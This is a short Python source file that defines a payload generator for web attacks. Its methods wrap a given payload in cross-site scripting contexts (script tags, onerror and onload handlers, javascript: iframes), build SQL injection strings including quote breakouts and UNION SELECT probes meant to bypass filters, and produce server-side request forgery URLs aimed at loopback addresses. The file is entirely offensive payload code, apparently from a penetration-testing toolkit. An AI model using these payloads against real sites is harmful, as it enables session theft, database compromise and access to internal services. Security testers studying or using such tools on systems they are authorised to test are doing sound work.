from typing import List

class PolyglotGenerator:
    @staticmethod
    def xss_polyglot(base_payload: str) -> List[str]:
        """Generate XSS polyglot payloads with different contexts."""
        return [
            f"<script>{base_payload}</script>",
            f"\"'><script>{base_payload}</script>",
            f"'><img src=x onerror={base_payload}>",
            f"<svg/onload={base_payload}>",
            f"<iframe src='javascript:{base_payload}'></iframe>"
        ]

    @staticmethod
    def sqli_polyglot(base_payload: str) -> List[str]:
        """Generate SQLi polyglots for bypassing filters."""
        return [
            f"{base_payload} OR 1=1--",
            f"{base_payload}' OR '1'='1' --",
            f"{base_payload}\" OR \"1\"=\"1\" --",
            f"{base_payload} UNION SELECT NULL,NULL,NULL--"
        ]

    @staticmethod
    def ssrf_polyglot(base_url: str) -> List[str]:
        """Generate SSRF variations."""
        return [
            f"http://{base_url}",
            f"https://{base_url}",
            f"http://127.0.0.1/{base_url}",
            f"http://localhost/{base_url}",
            f"http://[::1]/{base_url}"
        ]
